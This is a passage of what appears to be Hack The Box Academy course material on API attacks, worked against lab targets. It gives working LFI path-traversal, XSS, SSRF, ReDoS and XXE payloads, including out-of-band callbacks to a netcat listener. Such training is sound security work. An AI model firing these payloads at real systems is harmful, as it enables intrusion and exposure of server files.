+<pre><code class="lang-shell-session">root@htb[/htb]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://&lt;TARGET IP&gt;:3000/api/FUZZ'
+
+        /'___<span class="hljs-symbol">\ </span> /'___<span class="hljs-symbol">\ </span>          /'___<span class="hljs-symbol">\ </span>      
+       /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/ /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/  __  __  /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/       
+       <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\ </span>     
+        <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/ <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/      
+         <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>___/  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>      
+          <span class="hljs-symbol">\/</span>_/    <span class="hljs-symbol">\/</span>_/   <span class="hljs-symbol">\/</span>___/    <span class="hljs-symbol">\/</span>_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://&lt;TARGET IP&gt;:3000/api/FUZZ
+ :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+:: Progress: [40/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors
+download                [Status: 200, Size: 71, Words: 5, Lines: 1]
+:: Progress: [87/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: 
+Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: 
+Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</code></pre>
+<p>It looks like <code>/api/download</code> is a valid API endpoint. Let us interact with it</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3000/</span>api/download
+{<span class="hljs-string">"success"</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">"error"</span>:<span class="hljs-string">"Input the filename via /download/&lt;filename&gt;"</span>}
+</code></pre>
+<p>We need to specify a file, but we do not have any knowledge of stored files or their naming scheme. We can try mounting a Local File Inclusion (LFI) attack, though.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ curl <span class="hljs-string">"http://&lt;TARGET IP&gt;:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"</span>
+<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost
+<span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> nix01-websvc
+
+<span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span>
+<span class="hljs-type">::</span><span class="hljs-number">1</span>     ip6-localhost ip6-loopback
+fe00<span class="hljs-type">::</span><span class="hljs-number">0</span> ip6-localnet
+ff00<span class="hljs-type">::</span><span class="hljs-number">0</span> ip6-mcastprefix
+ff02<span class="hljs-type">::</span><span class="hljs-number">1</span> ip6-allnodes
+ff02<span class="hljs-type">::</span><span class="hljs-number">2</span> ip6-allrouters
+</code></pre>
+<p>The API is indeed vulnerable to Local File Inclusion!</p>
+<h2 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS)</h2>
+<hr>
+<p>Cross-Site Scripting (XSS) vulnerabilities affect web applications and APIs alike. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. Our <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a> module covers XSS in detail.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.</p>
+<p>Suppose we are having a better look at the API of the previous section, <code>http://&lt;TARGET IP&gt;:3000/api/download</code>.</p>
+<p>Let us first interact with it through the browser by requesting the below.</p>
+<p><img src="storage\modules\160\6.png" alt=""></p>
+<p><code>test_value</code> is reflected in the response.</p>
+<p>Let us see what happens when we enter a payload such as the below (instead of _test_value_).</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p><img src="storage\modules\160\9.png" alt="image"></p>
+<p>It looks like the application is encoding the submitted payload. We can try URL-encoding our payload once and submitting it again, as follows.</p>
+<pre><code class="lang-javascript"><span class="xml"></span><span class="perl">%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E</span><span class="xml"></span>
+</code></pre>
+<p><img src="storage\modules\160\10.png" alt="image"></p>
+<p>Now our submitted JavaScript payload is evaluated successfully. The API endpoint is vulnerable to XSS!</p>
+<h2 id="server-side-request-forgery-ssrf-">Server-Side Request Forgery (SSRF)</h2>
+<hr>
+<p>Server-Side Request Forgery (SSRF) attacks, listed in the OWASP top 10, allow us to abuse server functionality to perform internal or external resource requests on behalf of the server. We usually need to supply or modify URLs used by the target application to read or submit data. Exploiting SSRF vulnerabilities can lead to:</p>
+<ul>
+<li>Interacting with known internal systems</li>
+<li>Discovering internal services via port scans</li>
+<li>Disclosing local/sensitive data</li>
+<li>Including files in the target application</li>
+<li>Leaking NetNTLM hashes using UNC Paths (Windows)</li>
+<li>Achieving remote code execution</li>
+</ul>
+<p>We can usually find SSRF vulnerabilities in applications or APIs that fetch remote resources. Our <a href="https://academy.hackthebox.com/module/details/145">Server-side Attacks</a> module covers SSRF in detail.</p>
+<p>As we have mentioned multiple times, though, we should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources.</p>
+<p>Let us assess together an API that is vulnerable to SSRF.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target API and follow along.</p>
+<p>Suppose we are assessing such an API residing in <code>http://&lt;TARGET IP&gt;:3000/api/userinfo</code>.</p>
+<p>Let us first interact with it.</p>
+<p>Server-Side Request Forgery (SSRF)</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3000/</span>api/userinfo
+{<span class="hljs-string">"success"</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">"error"</span>:<span class="hljs-string">"'id' parameter is not given."</span>}
+</code></pre>
+<p>The API is expecting a parameter called <em>id</em>. Since we are interested in identifying SSRF vulnerabilities in this section, let us set up a Netcat listener first</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">4444</span>
+listening on [any] <span class="hljs-number">4444</span> ...
+</code></pre>
+<p>Then, let us specify <code>http://&lt;VPN/TUN Adapter IP&gt;:&lt;LISTENER PORT&gt;</code> as the value of the <em>id</em> parameter and make an API call.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl "http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3000/api</span><span class="hljs-regexp">/userinfo?id=http:/</span><span class="hljs-regexp">/&lt;VPN/</span>TUN Adapter IP&gt;<span class="hljs-symbol">:&lt;LISTENER</span> PORT&gt;<span class="hljs-string">"
+{"</span>success<span class="hljs-string">":false,"</span>error<span class="hljs-string">":"</span><span class="hljs-string">'id'</span> parameter is invalid.<span class="hljs-string">"}</span>
+</code></pre>
+<p>We notice an error about the <em>id</em> parameter being invalid, and we also notice no connection being made to our listener.</p>
+<p>In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding <code>http://&lt;VPN/TUN Adapter IP&gt;:&lt;LISTENER PORT&gt;</code> and making an API call again.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ echo "http:/</span><span class="hljs-regexp">/&lt;VPN/</span>TUN Adapter IP&gt;<span class="hljs-symbol">:&lt;LISTENER</span> PORT&gt;<span class="hljs-string">" | tr -d '\n' | base64
+root@htb[/htb]$ curl "</span><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/&lt;TARGET IP&gt;:3000/api</span><span class="hljs-regexp">/userinfo?id=&lt;BASE64 blob&gt;"</span>
+</code></pre>
+<p>When you make the API call, you will notice a connection being made to your Netcat listener. The API is vulnerable to SSRF.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">4444</span>
+listening <span class="hljs-keyword">on</span> [<span class="hljs-literal">any</span>] <span class="hljs-number">4444</span> ...
+connect <span class="hljs-keyword">to</span> [<span class="hljs-variable">&lt;VPN/TUN Adapter IP&gt;</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-variable">&lt;TARGET IP&gt;</span>] <span class="hljs-number">50542</span>
+GET / HTTP/<span class="hljs-number">1.1</span>
+Accept: application/json, text/plain, */*
+User-Agent: axios/<span class="hljs-number">0.24</span>.<span class="hljs-number">0</span>
+Host: <span class="hljs-variable">&lt;VPN/TUN Adapter IP&gt;</span>:<span class="hljs-number">4444</span>
+Connection: close
+</code></pre>
+<p>As time allows, try to provide APIs with input in various formats/encodings.</p>
+<h2 id="regular-expression-denial-of-service-redos-">Regular Expression Denial of Service (ReDoS)</h2>
+<hr>
+<p>Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.</p>
+<p>Let us assess an API that is vulnerable to ReDoS attacks together.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.</p>
+<p>The API resides in <code>http://&lt;TARGET IP&gt;:3000/api/check-email</code> and accepts a parameter called <em>email</em>.</p>
+<p>Let's interact with it as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-string">$ </span>curl <span class="hljs-comment">"http://&lt;TARGET IP&gt;:3000/api/check-email?email=test_value"</span>
+{<span class="hljs-comment">"regex"</span>:<span class="hljs-comment">"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/"</span>,<span class="hljs-comment">"success"</span>:<span class="hljs-keyword">false</span>}
+</code></pre>
+<p>Submit the above regex to <a href="https://regex101.com/">regex101.com</a> for an in-depth explanation. Then, submit the above regex to <a href="https://jex.im/regulex/#!flags=\&amp;re=%5E\(%5Ba-zA-Z0-9\_.-%5D\">https://jex.im/regulex/</a>%2B%40((%5Ba-zA-Z0-9-%5D)%2B.)%2B(%5Ba-zA-Z0-9%5D%7B2%2C4%7D)%2B%24) for a visualization.</p>
+<p><img src="storage\modules\160\TXFOUkOko.png" alt="image"></p>
+<p>The second and third groups are doing bad iterative checks.</p>
+<p>Let's submit the following valid value and see how long the API takes to respond.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-string">$ </span>curl <span class="hljs-comment">"http://&lt;TARGET IP&gt;:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."</span>
+{<span class="hljs-comment">"regex"</span>:<span class="hljs-comment">"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/"</span>,<span class="hljs-comment">"success"</span>:<span class="hljs-keyword">false</span>}
+</code></pre>
+<p>You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.</p>
+<p>The difference in response time between the first cURL command above and the second is significant.</p>
+<p>The API is undoubtedly vulnerable to ReDoS attacks.</p>
+<h2 id="xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</h2>
+<hr>
+<p>XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our <a href="https://academy.hackthebox.com/module/details/134">Web Attacks</a> module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.</p>
+<p>Let us assess together an API that is vulnerable to XXE Injection.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.</p>
+<p>Suppose we are assessing such an application residing in <code>http://&lt;TARGET IP&gt;:3001</code>.</p>
+<p>By the time we browse <code>http://&lt;TARGET IP&gt;:3001</code>, we come across an authentication page.</p>
+<p>Run Burp Suite as follows.</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ burpsuite
+</code></pre>
+<p>Activate burp suite's proxy (<em>Intercept On</em>) and configure your browser to go through it.</p>
+<p>Now let us try authenticating. We should see the below inside Burp Suite's proxy.</p>
+<p><img src="storage\modules\160\11.png" alt="image"></p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/login/</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: &lt;TARGET IP&gt;:3001
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: text/plain;charset=UTF-8
+<span class="hljs-attribute">Content-Length</span>: 111
+<span class="hljs-attribute">Origin</span>: http://&lt;TARGET IP&gt;:3001
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://&lt;TARGET IP&gt;:3001/
+<span class="hljs-attribute">Sec-GPC</span>: 1
+
+<span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>test@test.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>P@ssw0rd123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span>
+</code></pre>
+<ul>
+<li>We notice that an API is handling the user authentication functionality of the application.</li>
+<li>User authentication is generating XML data.</li>
+</ul>
+<p>Let us try crafting an exploit to read internal files such as <em>/etc/passwd</em> on the server.</p>
+<p>First, we will need to append a DOCTYPE to this request.</p>
+<p>What is a DOCTYPE?</p>
+<p>DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).</p>
+<p>Our current payload is:</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE pwn [&lt;!ENTITY somename SYSTEM "http://&lt;VPN/TUN Adapter IP&gt;:&lt;LISTENER PORT&gt;"&gt; ]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>test@test.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>P@ssw0rd123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p>We defined a DTD called <em>pwn</em>, and inside of that, we have an <code>ENTITY</code>. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the <code>ENTITY</code> name and its value.</p>
+<p>We have called our external entity <em>somename</em>, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as <code>file://</code> to call internal files.</p>
+<p>Let us set up a Netcat listener as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">4444</span>
+listening on [any] <span class="hljs-number">4444</span> ...
+</code></pre>
+<p>Now let us make an API call containing the payload we crafted above.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3001/api/login -d '<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-meta">&lt;!DOCTYPE pwn [&lt;!ENTITY somename SYSTEM "http://&lt;VPN/TUN Adapter IP&gt;:&lt;LISTENER PORT&gt;"&gt; ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>test@test.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>P@ssw0rd123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>'
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Sorry, we cannot find a account with <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> email.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+</code></pre>
+<p>We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3001/api/login -d '<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-meta">&lt;!DOCTYPE pwn [&lt;!ENTITY somename SYSTEM "http://&lt;VPN/TUN Adapter IP&gt;:&lt;LISTENER PORT&gt;"&gt; ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>&amp;somename;<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>P@ssw0rd123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>'
+</code></pre>
+<p>After the call to the API, you will notice a connection being made to the listener.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nlvp <span class="hljs-number">4444</span>
+listening on [any] <span class="hljs-number">4444</span> ...
+connect <span class="hljs-keyword">to</span> <span class="hljs-meta">[&lt;VPN/TUN Adapter IP&gt;]</span> from (UNKNOWN) <span class="hljs-meta">[&lt;TARGET IP&gt;]</span> <span class="hljs-number">54984</span>
+GET / HTTP/<span class="hljs-number">1.0</span>
+Host: &lt;VPN/TUN Adapter IP&gt;:<span class="hljs-number">4444</span>
+Connection: close
+</code></pre>
+<p>The API is vulnerable to XXE Injection.</p>
+</div></body></html>
